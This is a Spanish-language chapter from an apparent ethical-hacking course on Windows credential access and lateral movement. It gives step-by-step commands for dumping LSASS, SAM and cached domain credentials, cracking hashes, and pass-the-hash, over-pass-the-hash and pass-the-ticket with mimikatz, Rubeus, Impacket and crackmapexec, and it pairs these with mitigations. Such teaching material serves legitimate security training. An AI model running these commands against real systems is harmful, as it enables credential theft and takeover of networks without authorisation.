| **Inicio**         | **atrás 2**                                               | **Siguiente 4**                                                  |
| ------------------ | --------------------------------------------------------- | ---------------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./5_2_Hacking_Etico_en_Entornos_Active_Directory.md) | [⏩](./5_4_Hacking_avanzado_de_aplicaciones_web_y_bug_bounty.md) |

---

## **Índice**

| Temario                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------- |
| [312. Autenticación y Autorización en Windows](#312-autenticación-y-autorización-en-windows)                           |
| [313. Volcado de lsass y SAM en Windows](#313-volcado-de-lsass-y-sam-en-windows)                                       |
| [314. Volcado de lsass y SAM en Linux](#314-volcado-de-lsass-y-sam-en-linux)                                           |
| [315. Volcado de credenciales de dominio cacheadas (mscash)](#315-volcado-de-credenciales-de-dominio-cacheadas-mscash) |
| [316. Pass The Hash con Windows](#316-pass-the-hash-con-windows)                                                       |
| [317. Over Pass The Hash / Pass The Key](#317-over-pass-the-hash--pass-the-key)                                        |
| [318. Pass The Ticket](#318-pass-the-ticket)                                                                           |
| [319. ASK-TGT/TGS](#319-ask-tgttgs)                                                                                    |
| [320. Kerberos Golden Ticket y Silver Ticket](#320-kerberos-golden-ticket-y-silver-ticket)                             |
| [321. NTLM Roasting](#321-ntlm-roasting)                                                                               |
| [322. LLMNR/NBTNS Poisoning](#322-llmnrnbtns-poisoning)                                                                |
| [323. NTLM/SMB Relay](#323-ntlmsmb-relay)                                                                              |
| [324. Token impersonation](#324-token-impersonation)                                                                   |
| [325. Problemas y errores instalación Covenant](#325-problemas-y-errores-instalación-covenant)                         |
| [326. Frameworks de postexplotación: Covenant](#326-frameworks-de-postexplotación-covenant)                            |

---

# **Acceso a credenciales y movimientos laterales**

## **312. Autenticación y Autorización en Windows**

### 🧠 ¿Qué es la Autenticación?

La **autenticación** es el proceso mediante el cual el sistema **verifica la identidad** de un usuario o entidad.

🔑 Ejemplo sencillo:

Cuando escribes tu **usuario y contraseña** al iniciar sesión en Windows, estás **autenticándote**. Windows valida que esa contraseña corresponde al usuario que dices ser.

---

### 🛡️ ¿Qué es la Autorización?

La **autorización** es el proceso que ocurre **después de la autenticación**, y determina **qué puede hacer** un usuario dentro del sistema.

🔧 Ejemplo sencillo:

Un usuario puede iniciar sesión (**autenticación exitosa**), pero **no podrá acceder** a ciertas carpetas o ejecutar algunos programas si **no tiene autorización**.

---

### 📋 Diferencia clave:

| Concepto      | ¿Qué valida?       | ¿Cuándo ocurre?         | Ejemplo               |
| ------------- | ------------------ | ----------------------- | --------------------- |
| Autenticación | ¿Quién eres?       | Al inicio de sesión     | Usuario y contraseña  |
| Autorización  | ¿Qué puedes hacer? | Luego de iniciar sesión | Acceder a una carpeta |

---

### 🔧 Mecanismos de Autenticación en Windows

1. **Contraseña local**
2. **Credenciales del dominio (Active Directory)**
3. **Smart Cards / Biometría**
4. **Kerberos (en entornos de dominio)**
5. **NTLM (cuando Kerberos no está disponible)**

---

### 🛠️ ¿Cómo Windows valida un usuario?

#### 🔹 En un equipo local:

- Windows compara la contraseña con la que está almacenada en la base de datos **SAM** (Security Accounts Manager).

#### 🔹 En un dominio (Active Directory):

- El equipo se conecta al **Controlador de Dominio (DC)** y usa protocolos como **Kerberos** o **NTLM** para autenticar.

---

### 🔑 ¿Qué pasa después de autenticarse?

Se crea un **token de acceso**, que incluye:

- El SID del usuario.
- Los SIDs de los grupos a los que pertenece.
- Los privilegios asociados.

Este token **acompaña al usuario** durante su sesión, y Windows lo revisa **cada vez que accede a algo**.

---

### 📁 Ejemplo práctico de Autorización

Supongamos que tienes dos usuarios:

- `Administrador`
- `Invitado`

Y una carpeta llamada `DocumentosPrivados`.

#### 🔐 Configurando permisos:

1. Haz clic derecho en la carpeta → **Propiedades** → **Seguridad**.
2. Elimina al grupo "Todos".
3. Agrega `Administrador` y dale **control total**.
4. Agrega `Invitado` y dale solo **lectura**.

Ahora:

- `Administrador` puede leer, escribir y eliminar archivos.
- `Invitado` solo puede ver los archivos, pero no modificarlos.

✅ Autenticación: Ambos pueden iniciar sesión.

✅ Autorización: Cada uno tiene diferentes **niveles de acceso**.

---

### 🖥️ Instalación y configuración de políticas (GPO)

Para controlar autenticación y autorización a nivel de dominio:

#### 📍 Requiere:

- Tener un **Domain Controller (DC)** ya instalado (con Active Directory y DNS configurado).
- Clientes unidos al dominio (Windows 10 o 11, por ejemplo).

#### 🔧 Crear GPO que limite quién puede iniciar sesión:

1. En el DC, abre `Group Policy Management`.

2. Crea una nueva GPO: `Restringir Inicio de Sesión`.

3. Edita la GPO:

   - Ve a: `Configuración del equipo` → `Políticas` → `Configuración de Windows` → `Configuración de seguridad` → `Asignación de derechos de usuario`.
   - Busca: **Permitir inicio de sesión local**.
   - Quita "Usuarios" y agrega solo el grupo o usuario deseado.

4. Aplica la GPO al grupo de PCs o UO correspondiente.

---

### 🧪 Ejemplo completo (Local y Dominio)

#### Escenario:

- Usuario: `gustavo`
- PC: `PC-GUSTAVO`
- Dominio: `empresa.local`
- DC: `SRV-DC01`

---

#### ✅ Autenticación local

```bash
Usuario: gustavo
Contraseña: Guss1234
```

- Windows valida en su base SAM.
- Si es correcta, se genera token con permisos locales.

---

#### ✅ Autenticación en dominio (con Kerberos)

```bash
Dominio: empresa.local
Usuario: gustavo
Contraseña: Guss1234
```

- Windows se comunica con el DC.
- El DC entrega un **TGT** y luego un **TGS**.
- El usuario tiene acceso a recursos según los permisos configurados en AD.

---

#### ✅ Autorización aplicada

- `gustavo` pertenece al grupo `Ventas`.
- En el servidor de archivos (`\\SRV-ARCHIVOS\Compartido`), sólo `Ventas` tiene acceso.
- Windows revisa el token de `gustavo`, ve que está en `Ventas` → acceso **permitido**.

Si otro usuario no pertenece al grupo → acceso **denegado**.

---

### 🔒 Mejores prácticas

- Usa **grupos** para controlar acceso, no usuarios individuales.
- Aplica el **principio de menor privilegio**.
- Habilita **auditoría** para detectar accesos no autorizados.
- Usa **contraseñas fuertes** y **MFA** si es posible.

---

[🔼](#índice)

---

## **313. Volcado de lsass y SAM en Windows**

### 🧠 ¿Qué es el volcado de LSASS y SAM?

En ciberseguridad, **volcar (dump)** significa **extraer contenido de la memoria o archivos sensibles del sistema**. Esto se hace para analizarlo o para extraer contraseñas.

---

#### 🔐 1. ¿Qué es LSASS?

`LSASS.exe` significa **Local Security Authority Subsystem Service**.
Es el proceso de Windows que:

- Valida usuarios.
- Administra políticas de seguridad.
- Guarda credenciales **en memoria** (hashes, tickets Kerberos, etc.).

---

#### 📁 2. ¿Qué es SAM?

`SAM` es la base de datos **Security Accounts Manager**, que almacena:

- Los **usuarios y sus contraseñas (hashes)** del sistema local.
- Está ubicado en: `C:\Windows\System32\config\SAM`
- Los hashes están protegidos con una clave del **SYSTEM** del registro.

---

### 🚨 ¿Por qué los atacantes quieren esto?

Porque si obtienen estos dumps pueden:

- Extraer **hashes de contraseñas**.
- Usarlos en **ataques Pass-the-Hash**.
- Crackear los hashes y obtener las **contraseñas en texto plano**.

---

### ⚙️ ¿Cómo se hace el volcado?

Existen varias formas, pero necesitas **privilegios de SYSTEM o administrador**.

---

### 🧪 Ejemplo 1: Volcado de LSASS con `procdump` (herramienta de Sysinternals)

#### ✅ Requisitos:

- Ser administrador.
- Tener `procdump.exe` de Sysinternals.

#### 📥 Paso 1: Descargar procdump

Desde:

[https://learn.microsoft.com/en-us/sysinternals/downloads/procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

#### 📦 Paso 2: Ejecutar volcado

```bash
procdump -accepteula -ma lsass.exe lsass.dmp
```

📌 Esto crea un archivo `lsass.dmp` con toda la memoria del proceso.

---

#### 🧩 Paso 3: Extraer credenciales con Mimikatz

Una vez tengas el dump, puedes usar [Mimikatz](https://github.com/gentilkiwi/mimikatz):

```bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

🔓 Verás usuarios, contraseñas en texto claro, hashes, tickets Kerberos, etc.

---

### 🧪 Ejemplo 2: Volcado de SAM local

Este ataque busca el archivo SAM y las claves del SYSTEM.

#### ✅ Paso 1: Copiar archivos (requiere SYSTEM)

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

Esto crea dos archivos: `sam.save` y `system.save`.

---

#### ✅ Paso 2: Extraer hashes con `secretsdump.py` (de Impacket)

```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

📌 Obtendrás los hashes NTLM de los usuarios locales.

---

### 💣 Herramientas populares para esto

| Herramienta                   | Función principal                |
| ----------------------------- | -------------------------------- |
| **Mimikatz**                  | Extrae credenciales de LSASS     |
| **Procdump**                  | Vuelca la memoria de procesos    |
| **secretsdump.py (Impacket)** | Extrae hashes de SAM/SYSTEM      |
| **Pypykatz**                  | Alternativa a Mimikatz en Python |

---

### 🧪 Ejemplo completo: Volcado de LSASS y análisis

#### 🖥️ Escenario:

- PC con Windows 10.
- Usuario: `admin` (con privilegios).
- Herramientas: `procdump.exe` y `mimikatz`.

#### 🔧 Pasos:

1. Ejecutas:

```cmd
procdump -ma lsass.exe lsass.dmp
```

2. Abres `mimikatz`:

```cmd
mimikatz.exe
```

3. Ejecutas comandos en mimikatz:

```bash
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

📌 Aparecen resultados como:

```
Username : gustavo
Domain   : PC-GUSTAVO
Password : Guss2024!
```

Ya tienes la contraseña en texto claro.

---

### 🔐 ¿Cómo protegerse?

1. **Evita cuentas con permisos de administrador innecesarios.**
2. **Usa Windows Defender Credential Guard.**
3. **Activa la protección del LSASS (PPL - Protected Process Light):**

```powershell
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
```

4. **Bloquea el uso de herramientas como mimikatz con antivirus/EPP.**
5. **Usa autenticación multifactor (MFA).**

---

### 🧠 Resumen

| Elemento    | ¿Qué es?                            | Contiene                               |
| ----------- | ----------------------------------- | -------------------------------------- |
| `LSASS.exe` | Proceso que gestiona la seguridad   | Credenciales activas (en memoria)      |
| `SAM`       | Base de datos de usuarios locales   | Hashes de contraseñas locales          |
| Volcado     | Técnica de extraer datos en memoria | Usado para ataques de post-explotación |

---

[🔼](#índice)

---

## **314. Volcado de lsass y SAM en Linux**

### 🧠 ¿Qué es el volcado de LSASS y SAM desde Linux?

Cuando atacas un entorno Windows desde una máquina **Linux (ej. Kali)**, puedes intentar extraer:

- 🧠 **LSASS**: contiene contraseñas en memoria (hashes, texto claro, tickets Kerberos).
- 🔐 **SAM**: contiene hashes de contraseñas locales (persistentes, no solo en memoria).

Esto se conoce como **post-explotación** y requiere que el atacante tenga acceso (usuario, hash o shell) al sistema Windows.

---

### 🎯 Requisitos previos

- Una máquina Linux (Kali, Parrot, Ubuntu).
- Un sistema Windows objetivo (Windows 10, Server, etc.).
- Acceso con usuario y contraseña, hash o shell remoto.
- Herramientas como:

  - `Impacket` (secretsdump.py, smbexec.py, etc.)
  - `pypykatz` (versión en Python de mimikatz)
  - `crackmapexec` (para automatizar ataques)
  - `rpcclient` (interacción con servicios de red Windows)

---

### ✅ Parte 1: Volcado remoto del SAM (desde Linux)

#### 📦 Herramienta: `secretsdump.py` de **Impacket**

Se usa para obtener los hashes de la SAM **remotamente**, usando:

- Usuario + contraseña
- Usuario + hash NTLM

---

#### 📥 Instalación de Impacket (si no lo tienes):

```bash
sudo apt update
sudo apt install impacket-scripts -y
```

> O instalar desde el repositorio:

```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip install .
```

---

#### 🚀 Ejemplo de uso: Obtener hashes de SAM

```bash
secretsdump.py gustavo:MiContraseña123@192.168.1.100
```

📌 Resultado típico:

```
[*] Dumping local SAM hashes (registry)
gustavo:500:aad3b435b51404eeaad3b435b51404ee:e52cac67419a9a2238f10713b629b565:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

🧠 Estos hashes los puedes crackear con **hashcat** o **john**.

---

### ✅ Parte 2: Volcado de LSASS (memoria) desde Linux

#### 🧪 Escenario:

Ya tienes acceso remoto al Windows (por shell o SMB), ahora quieres el contenido de **LSASS.exe** (contraseñas en memoria).

#### 🔧 Opción 1: Usando `smbexec.py` + `procdump.exe`

##### 📥 Paso 1: Sube `procdump.exe` desde Kali al host Windows

```bash
smbclient //192.168.1.100/C$ -U gustavo
put procdump.exe
```

---

##### 🧨 Paso 2: Ejecuta `procdump` remotamente para volcar LSASS

```bash
smbexec.py gustavo:MiContraseña123@192.168.1.100
```

Una vez tengas acceso a shell remoto tipo CMD, ejecutas:

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Luego descargas `lsass.dmp` a Kali:

```bash
smbclient //192.168.1.100/C$ -U gustavo
get lsass.dmp
```

---

#### 🧩 Paso 3: Analiza con `pypykatz` (versión mimikatz en Linux)

Instala `pypykatz`:

```bash
pip install pypykatz
```

Ejecuta:

```bash
pypykatz lsa minidump lsass.dmp
```

📌 Verás salida como esta:

```
Username : gustavo
Domain   : PC-GUSTAVO
Password : Guss2024!
```

---

### ✅ Parte 3: Alternativa con `crackmapexec` (CME)

CrackMapExec permite automatizar:

- Enumeración
- Dump de SAM
- Dump de LSASS
- RCE

Instalación:

```bash
sudo apt install crackmapexec
```

Ejemplo: Dump de SAM:

```bash
crackmapexec smb 192.168.1.100 -u gustavo -p MiContraseña123 --sam
```

Dump de LSASS:

```bash
crackmapexec smb 192.168.1.100 -u gustavo -p MiContraseña123 --lsa
```

---

### 🧪 Ejemplo completo real

1. Estás en Kali y tienes las credenciales de un admin de Windows:

   - Usuario: `gustavo`
   - IP del host: `192.168.1.100`
   - Contraseña: `MiContraseña123`

2. Ejecutas desde Kali:

```bash
secretsdump.py gustavo:MiContraseña123@192.168.1.100
```

Y obtienes:

```
admin:1000:aad3...:8846f7eaee8fb117ad06bdd830b7586c:::
```

3. Usas Hashcat:

```bash
hashcat -m 1000 hash.txt rockyou.txt
```

4. Para LSASS:

- Subes `procdump.exe`
- Lo ejecutas remotamente con `smbexec.py`
- Descargas `lsass.dmp`
- Analizas con:

```bash
pypykatz lsa minidump lsass.dmp
```

Y ves contraseñas en claro.

---

### 🔒 ¿Cómo protegerse?

- Usa **Credential Guard** para proteger LSASS.
- Aplica el modo PPL (Protected Process Light).
- No uses cuentas con privilegios elevados todo el tiempo.
- Usa EDRs que bloqueen procdump y mimikatz.
- Revisa logs de acceso remoto y volcado de memoria.

---

### 🧠 Resumen

| Técnica      | Herramienta             | Desde Linux | Resultado                   |
| ------------ | ----------------------- | ----------- | --------------------------- |
| Volcar SAM   | `secretsdump.py`        | ✅ Sí       | Hashes de usuarios locales  |
| Volcar LSASS | `procdump` + `pypykatz` | ✅ Sí       | Contraseñas en memoria      |
| Automatizado | `crackmapexec`          | ✅ Sí       | Volcado de SAM o LSA remoto |

---

[🔼](#índice)

---

## **315. Volcado de credenciales de dominio cacheadas (mscash)**

### 🧠 ¿Qué son las credenciales cacheadas (mscash)?

Cuando un usuario de dominio inicia sesión en un equipo Windows **fuera de la red**, el sistema aún le permite acceder gracias a las **credenciales cacheadas**. Estas credenciales se guardan en el disco local en forma de **hashes mscash** (Microsoft Cache).

🧩 **Formato mscash**:

- También conocido como `DCC` (Domain Cached Credentials).
- Sirve para validar al usuario cuando no hay conexión al Domain Controller.

---

#### 📌 ¿Dónde se guardan?

Windows guarda los hashes en el **registro**, en esta clave:

```
HKEY_LOCAL_MACHINE\Security\Cache
```

Estos datos no son visibles fácilmente desde el editor de registro, pero pueden ser extraídos con privilegios elevados.

---

### ✅ ¿Qué se necesita para volcar mscash?

1. Acceso con privilegios **de administrador o SYSTEM** al sistema Windows objetivo.
2. O bien, acceso al **archivo SYSTEM y SECURITY** del equipo objetivo (puede hacerse con una herramienta de red o físico).
3. Herramientas desde Linux:

   - `impacket-secretsdump`
   - `mimikatz` o `pypykatz`
   - `hashcat` o `john` para crackear los hashes

---

### 🔧 Instalación de herramientas necesarias en Kali Linux

#### 1. Instalar `Impacket` (si no lo tienes):

```bash
sudo apt update
sudo apt install impacket-scripts -y
```

O desde GitHub:

```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip install .
```

#### 2. Instalar `pypykatz` (opcional):

```bash
pip install pypykatz
```

---

### 🎯 ¿Cómo hacer el volcado de mscash?

#### Opción 1: Usando `secretsdump.py` (remotamente)

Si tienes acceso con credenciales a la máquina:

```bash
secretsdump.py gustavo:MiContraseña123@192.168.1.100
```

📌 Entre los resultados, verás entradas tipo `DCC2` (mscash2):

```
[*] Dumping cached domain logon information (domain/username:hash)
DOMINIO\gustavo:$DCC2$10240#gustavo#8f4e2fd68c1184f748df7e1a3f1de88f
```

Ese es el **hash mscash** del usuario `gustavo`.

---

#### Opción 2: Volcado offline (desde archivos SYSTEM y SECURITY)

Si tienes acceso físico o por red a los archivos de Windows:

```bash
secretsdump.py -system SYSTEM -security SECURITY LOCAL
```

> Estos archivos están en:
>
> - `C:\Windows\System32\Config\SYSTEM`
> - `C:\Windows\System32\Config\SECURITY`

---

#### Crackeo del hash mscash

Este tipo de hash se puede crackear con `john` o `hashcat`.

##### 🪓 Con Hashcat

Guarda el hash en un archivo `mscash.txt`:

```
$DCC2$10240#gustavo#8f4e2fd68c1184f748df7e1a3f1de88f
```

Comando:

```bash
hashcat -m 2100 mscash.txt rockyou.txt
```

##### 🪓 Con John the Ripper

Primero convierte con `john` si es necesario:

```bash
john --format=mscash2 mscash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### 💡 Ejemplo práctico paso a paso

1. Tienes una máquina Kali y un Windows 10 víctima (IP: 192.168.1.100).
2. Sabes que hay un usuario de dominio que inició sesión en esa PC: `gustavo`.
3. Tienes credenciales válidas (admin):

```bash
secretsdump.py gustavo:MiContraseña123@192.168.1.100
```

Salida parcial:

```
[*] Dumping cached domain logon information
DOMINIO\gustavo:$DCC2$10240#gustavo#fcfbc889543b7c65f25989f33a1c6d23
```

4. Guardas el hash en `mscash.txt` y crackeas:

```bash
hashcat -m 2100 mscash.txt rockyou.txt
```

5. Recuperas la contraseña en claro si está en el diccionario.

---

### 🔐 ¿Cómo protegerse?

- Limita la cantidad de credenciales cacheadas:
  👉 Política de grupo:
  `Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options > Interactive logon: Number of previous logons to cache`

  Establece en 0 si es posible (no cachear).

- Usa BitLocker o cifrado completo del disco.

- Usa antivirus/EDR que bloqueen accesos al registro.

- Aplica control de acceso estricto (evitar cuentas con privilegios altos en estaciones de trabajo).

---

### 🧠 Resumen

| Paso                  | Herramienta                        | Desde Linux | Resultado                          |
| --------------------- | ---------------------------------- | ----------- | ---------------------------------- |
| Volcar mscash remoto  | `secretsdump.py`                   | ✅          | Hash mscash del usuario de dominio |
| Volcar mscash offline | `secretsdump.py` + SYSTEM/SECURITY | ✅          | Hashes cacheados sin acceso remoto |
| Crackear hash         | `hashcat`, `john`                  | ✅          | Contraseña en texto claro          |

---

[🔼](#índice)

---

## **316. Pass The Hash con Windows**

### 🧠 ¿Qué es Pass The Hash (PtH)?

**Pass The Hash** es una técnica de post-explotación que **permite autenticarse en sistemas Windows reutilizando directamente el hash NTLM** de un usuario **sin necesidad de conocer su contraseña en texto claro**.

---

#### 🔐 ¿Por qué funciona?

Windows usa el **protocolo NTLM** para autenticar usuarios. Este protocolo permite que el sistema verifique un **hash** en lugar de una contraseña en texto claro.
Por lo tanto, si un atacante **consigue el hash NTLM**, puede usarlo para autenticarse en otro equipo como si fuera el usuario legítimo.

---

### 📦 Herramientas para hacer Pass The Hash

Puedes usar varias herramientas desde **Linux (Kali)** o **Windows**:

#### 🐧 En Linux:

- `impacket-psexec.py`
- `crackmapexec`
- `smbclient`
- `pth-winexe` (obsoleto pero educativo)

#### 🪟 En Windows:

- `mimikatz`
- `Rubeus`
- `evil-winrm` (en ataques a servidores con WinRM)

---

### 💻 Requisitos

- Tener un **hash NTLM válido** de una cuenta (por ejemplo, con `secretsdump`, `mimikatz` o volcado de `LSASS`).
- La cuenta debe tener **permisos sobre el objetivo** (por ejemplo, admin remoto).
- El puerto 445 (SMB) o WinRM debe estar abierto en el objetivo.

---

### 🛠 Instalación de herramientas necesarias en Kali Linux

#### 1. Instalar Impacket

```bash
sudo apt update
sudo apt install impacket-scripts -y
```

O:

```bash
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip install .
```

#### 2. Instalar CrackMapExec (opcional pero útil)

```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
pip install -r requirements.txt
python setup.py install
```

---

### 🧪 Ejemplo completo de Pass The Hash

#### 🧩 Supuestos:

- IP de la víctima: `192.168.1.100`
- Usuario con hash NTLM: `gustavo`
- Hash NTLM: `aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4`
- El usuario tiene permisos de administrador remoto

---

#### ✅ Opción 1: Usando `impacket-psexec.py`

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 gustavo@192.168.1.100
```

📌 Este comando abrirá una **shell interactiva** en el sistema Windows remoto como `gustavo`.

---

#### ✅ Opción 2: Usando `crackmapexec`

```bash
crackmapexec smb 192.168.1.100 -u gustavo -H 32ed87bdb5fdc5e9cba88547376818d4 --exec 'whoami'
```

🔎 Esto ejecuta `whoami` remotamente usando el hash NTLM.

---

#### ✅ Opción 3: Usando `mimikatz` en Windows

1. Abre `mimikatz` como administrador en un equipo Windows.

2. Usa el siguiente comando para hacer un "Pass The Hash" desde sesión local:

```mimikatz
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:gustavo /domain:DOMINIO /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```

Esto abre una nueva terminal `cmd` autenticada como `gustavo` con el hash NTLM.

---

### 🔐 ¿Cómo prevenir el Pass The Hash?

1. **Evita que cuentas privilegiadas inicien sesión en estaciones de trabajo.**
2. **Segmenta la red y usa cuentas de administración local únicas.**
3. Usa **LSA Protection** para proteger `lsass.exe` (evita volcados).
4. Usa **autenticación Kerberos** cuando sea posible.
5. Habilita herramientas EDR que detecten uso de hashes.

---

### 🧠 Resumen general

| Herramienta       | Sistema    | Uso principal                |
| ----------------- | ---------- | ---------------------------- |
| `impacket-psexec` | Kali Linux | Autenticación remota via SMB |
| `crackmapexec`    | Kali Linux | Automatización y exploración |
| `mimikatz`        | Windows    | Generar sesión con hash NTLM |
| `evil-winrm`      | Kali Linux | Conexión a WinRM con hash    |

---

[🔼](#índice)

---

## **317. Over Pass The Hash / Pass The Key**

### 🧠 ¿Qué es Over Pass The Hash (Pass The Key)?

**Over Pass The Hash (OPTH)** es una técnica de post-explotación en entornos Windows/Active Directory que permite **obtener un ticket Kerberos TGT válido utilizando directamente un hash NTLM** en lugar de una contraseña.

🔐 A diferencia del clásico **Pass The Hash**, que trabaja con NTLM, **OPTH permite autenticarse a través de Kerberos**, que es más moderno y más usado en dominios Windows.

---

### 📌 ¿Cuándo se usa Over Pass The Hash?

Se utiliza cuando:

- Ya tienes el **hash NTLM** de una cuenta de dominio.
- Quieres **autenticarse usando Kerberos** (por ejemplo, para un ataque Kerberoasting o acceso remoto con ticket TGT).
- NTLM está bloqueado, pero Kerberos sigue activo.

---

### ⚙️ ¿Cómo funciona?

1. Tienes el **hash NTLM** de una cuenta (por ejemplo, un administrador).
2. Generas un **ticket TGT Kerberos** (con tools como `mimikatz` o `Rubeus`).
3. Inyectas ese ticket en tu sesión actual.
4. Luego puedes acceder a recursos Kerberos (como `cifs`, `LDAP`, `WinRM`, etc).

---

### 🧰 Herramientas necesarias

#### En **Windows**:

- [x] [`Mimikatz`](https://github.com/gentilkiwi/mimikatz)
- [x] [`Rubeus`](https://github.com/GhostPack/Rubeus)

#### En **Kali Linux** (opcional, solo si usas una VM):

- Acceso a la red de Active Directory
- `Impacket` para otras acciones relacionadas

---

### 🛠 Instalación de herramientas

#### 🪟 En Windows (Mimikatz):

1. Descarga desde:
   👉 [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
   (Usa `mimikatz_trunk.zip`, extrae y ejecuta como admin)

2. Ejecuta `mimikatz.exe` como **Administrador**.

---

### ✅ Ejemplo práctico con Mimikatz (Over Pass The Hash)

#### 🎯 Escenario:

- Dominio: `hack.local`
- Usuario: `gustavo`
- Hash NTLM: `32ed87bdb5fdc5e9cba88547376818d4`
- Nombre NetBIOS del dominio: `HACK`
- Nombre del DC: `dc.hack.local`

---

#### Paso 1️⃣: Abrir Mimikatz como Administrador

```cmd
mimikatz # privilege::debug
```

🔒 Este comando habilita privilegios para manipular tokens y procesos.

---

#### Paso 2️⃣: Ejecutar `sekurlsa::pth` para obtener TGT

```mimikatz
sekurlsa::pth /user:gustavo /domain:hack.local /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe
```

📌 Esto abrirá **una nueva consola** (`cmd.exe`) que contiene el **ticket TGT** del usuario `gustavo`.

---

#### Paso 3️⃣: Verificar que el TGT esté presente

Dentro del nuevo `cmd`, ejecuta:

```cmd
klist
```

👉 Verás un **Ticket de Kerberos TGT** válido como:

```
Cached Tickets:
#0> Client: gustavo @ HACK.LOCAL
    Server: krbtgt/HACK.LOCAL @ HACK.LOCAL
```

---

#### Paso 4️⃣: Acceso a recursos del dominio

Con ese ticket Kerberos, puedes acceder a recursos como:

```cmd
dir \\dc.hack.local\C$
```

O usar `PsExec`, `WinRM`, `ldapsearch`, o incluso ataques como **Kerberoasting** o **DCSync** si tienes permisos.

---

### ✅ Ejemplo usando Rubeus (más técnico)

1. Descarga y compila `Rubeus` o usa una versión precompilada.
2. Ejecuta:

```powershell
Rubeus.exe asktgt /user:gustavo /domain:hack.local /rc4:32ed87bdb5fdc5e9cba88547376818d4 /ptt
```

📌 Esto automáticamente **pide el TGT y lo inyecta (ptt = Pass The Ticket)** en la sesión actual.

3. Confirma con:

```powershell
klist
```

---

### 🛡 ¿Cómo mitigar Over Pass The Hash?

1. **Protege los hashes NTLM**: Usa LSA Protection (`RunAsPPL`) para proteger `lsass.exe`.
2. **Usa cuentas de administración separadas**.
3. **Evita que cuentas privilegiadas inicien sesión en estaciones vulnerables**.
4. **Audita tickets Kerberos y accesos** con herramientas como Microsoft ATA, Defender for Identity, etc.
5. **Aplica monitoreo de klist, sekurlsa y pth en EDRs**.

---

### 📚 Resumen

| Técnica                | Usa NTLM Hash | Usa Kerberos | Herramienta común    |
| ---------------------- | ------------- | ------------ | -------------------- |
| **Pass The Hash**      | ✅ Sí         | ❌ No        | `psexec`, `mimikatz` |
| **Over Pass The Hash** | ✅ Sí         | ✅ Sí        | `mimikatz`, `rubeus` |
| **Pass The Ticket**    | ❌ No         | ✅ Sí        | `kerberos::ptt`      |

---

[🔼](#índice)

---

## **318. Pass The Ticket**

### 🧠 ¿Qué es Pass The Ticket (PTT)?

**Pass The Ticket** es una técnica de post-explotación en entornos Windows/Active Directory que permite **usar directamente un ticket Kerberos TGT o TGS** (robado o creado) para autenticarse en nombre de un usuario sin necesidad de su contraseña ni su hash NTLM.

🎯 Es una evolución de técnicas como **Pass The Hash**, pero funciona a nivel de **Kerberos**, el protocolo de autenticación más usado en entornos de dominio.

---

### 🧩 ¿Cómo funciona Pass The Ticket?

1. Se obtiene un **ticket Kerberos** (TGT o TGS), ya sea:

   - Robándolo desde la memoria (`lsass.exe`)
   - Generándolo con herramientas (como `Rubeus`)

2. Ese ticket se **inyecta en la sesión actual** del sistema operativo.
3. Una vez inyectado, el sistema cree que eres ese usuario y te deja **acceder a recursos Kerberos** (como carpetas compartidas, LDAP, WinRM, etc.).

---

### 🔧 ¿Qué se necesita?

- Un **ticket Kerberos** (`.kirbi`) válido (TGT o TGS).
- Herramientas como:

  - `mimikatz`
  - `Rubeus`

- Un sistema **Windows** (puede ser una VM).
- Permisos de **Administrador local** para inyectar tickets.

---

### ⚙️ Instalación de herramientas

#### ✅ **Mimikatz** (Windows)

1. Descarga desde:
   👉 [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)
   Selecciona `mimikatz_trunk.zip`.

2. Extrae el ZIP y ejecuta `mimikatz.exe` como **Administrador**.

---

### 🧪 Ejemplo práctico completo

#### 🎯 Escenario:

- Usuario de dominio: `gustavo@hack.local`
- Dominio: `hack.local`
- Ticket Kerberos robado: `gustavo_TGT.kirbi`
- Nombre del DC: `dc.hack.local`

---

#### 🪟 Paso 1: Abrir Mimikatz

Ejecuta `mimikatz.exe` como **Administrador** y habilita privilegios:

```mimikatz
privilege::debug
```

---

#### 🪪 Paso 2: Inyectar el ticket con `kerberos::ptt`

```mimikatz
kerberos::ptt C:\ruta\al\ticket\gustavo_TGT.kirbi
```

> El ticket se inyecta en la sesión actual. Desde este momento, Windows "cree" que eres el usuario `gustavo`.

---

#### 🧾 Paso 3: Verificar que el ticket esté cargado

```cmd
klist
```

Deberías ver algo como:

```
Current LogonId is 0:0x52f31
Cached Tickets: (1)
#0> Client: gustavo @ HACK.LOCAL
    Server: krbtgt/HACK.LOCAL @ HACK.LOCAL
```

---

#### 🧠 Paso 4: Acceder a recursos Kerberos

Por ejemplo, acceder a la carpeta administrativa del controlador de dominio:

```cmd
dir \\dc.hack.local\C$
```

¡Funcionará si `gustavo` tiene permisos!

---

### 🧪 ¿Cómo obtener un ticket?

Puedes usar `mimikatz` para extraerlo de otro usuario en el mismo equipo:

```mimikatz
sekurlsa::tickets
```

O usar `Rubeus` para solicitar e inyectar tickets automáticamente.

Ejemplo con `Rubeus`:

```powershell
Rubeus.exe asktgt /user:gustavo /domain:hack.local /rc4:<ntlm_hash> /ptt
```

---

